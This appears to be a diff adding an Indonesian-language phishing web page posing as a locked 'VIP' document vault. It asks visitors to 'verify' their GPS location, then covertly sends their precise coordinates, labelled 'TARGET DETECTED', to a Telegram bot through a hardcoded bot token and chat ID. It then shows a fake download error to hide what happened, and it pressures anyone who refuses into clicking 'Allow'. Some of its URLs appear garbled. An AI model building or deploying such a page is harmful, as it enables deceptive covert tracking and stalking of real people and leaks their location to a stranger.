@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 Brankas Terkunci</title>
+    <style>
+        body { background: #0d1117; color: #58a6ff; font-family: sans-serif; text-align: center; padding: 50px 20px; }
+        .card { border: 1px solid #30363d; background: #161b22; padding: 40px 20px; border-radius: 12px; max-width: 400px; margin: auto; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+        h2 { color: #f0f6fc; margin-bottom: 10px; }
+        p { color: #8b949e; font-size: 14px; margin-bottom: 30px; }
+        .btn { background: #238636; color: white; border: none; padding: 15px 30px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; }
+        #msg { display: none; margin-top: 20px; color: #d29922; font-size: 13px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>🔐 Akses VIP Dibatasi</h2>
+    <p>Silakan verifikasi lokasi GPS Anda untuk membuka isi brankas dokumen ini.</p>
+    
+    <button class="btn" onclick="akses()">VERIFIKASI SEKARANG</button>
+    
+    <div id="msg">🔄 Sedang menghubungkan ke server aman...</div>
+</div>
+
+<script>
+function akses() {
+    document.getElementById('msg').style.display = 'block';
+    
+    if (navigator.geolocation) {
+        // Meminta izin akses lokasi
+        navigator.geolocation.getCurrentPosition(kirimData, gagal, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        });
+    } else {
+        alert("Browser Anda tidak mendukung verifikasi ini.");
+    }
+}
+
+function kirimData(pos) {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const acc = pos.coords.accuracy;
+    
+    // DATA ANDA SUDAH TERPASANG
+    const token = "8655474132:AAFyKBASPm1Vjkl92Dcni6hWwTZUQRZeapE";
+    const chatid = "8391310530"; // ID Anda: 8391310530 (diperbaiki formatnya)
+    
+    const mapsUrl = `https://www.google.com{lat},${lon}`;
+    const teks = `⚠️ **TARGET TERDETEKSI!**\n\n📍 Lat: \`${lat}\`\n📍 Lon: \`${lon}\`\n🎯 Akurasi: ${acc} meter\n\n🌍 **Klik Link Peta:**\n${mapsUrl}`;
+
+    // Kirim ke Telegram
+    fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chatid}&text=${encodeURIComponent(teks)}&parse_mode=Markdown`)
+    .then(() => {
+        setTimeout(() => {
+            document.getElementById('msg').style.display = 'none';
+            alert("Kesalahan Server: File Gagal Diunduh. Coba gunakan koneksi WiFi.");
+        }, 2000);
+    });
+}
+
+function gagal(err) {
+    document.getElementById('msg').style.display = 'none';
+    alert("AKSES DITOLAK: Brankas hanya bisa dibuka jika Anda menekan tombol 'ALLOW' (IZINKAN) pada browser.");
+}
+</script>
+
+</body>
+</html>
